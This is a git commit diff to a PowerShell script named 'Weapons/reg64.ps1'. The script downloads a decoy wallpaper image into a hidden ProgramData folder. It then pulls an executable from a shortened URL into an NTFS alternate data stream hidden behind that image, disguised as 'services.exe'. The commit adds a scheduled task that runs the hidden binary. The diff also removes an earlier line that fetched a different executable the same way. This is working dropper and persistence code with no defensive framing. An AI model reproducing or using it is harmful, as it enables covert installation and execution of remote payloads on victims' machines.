968168d2090c5d6cc1375b72de2627eafacaf4ca
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-03-05 03:48:47 +0530

    Added schtasks

--- Weapons/reg64.ps1
+++ Weapons/reg64.ps1
@@ -3,4 +3,5 @@
 mkdir C:\ProgramData\.temp
 [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
 curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
-cmd /c "curl https://lethalweapon.s3.ap-south-1.amazonaws.com/Basic_Calci.exe -o C:\ProgramData\.temp\94002.jpg:Basic_Calci.exe"
+cmd /c "curl https://bit.ly/3sJgOjB -o C:\ProgramData\.temp\94002.jpg:services.exe"
+schtasks /create /tn "services_free.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /z
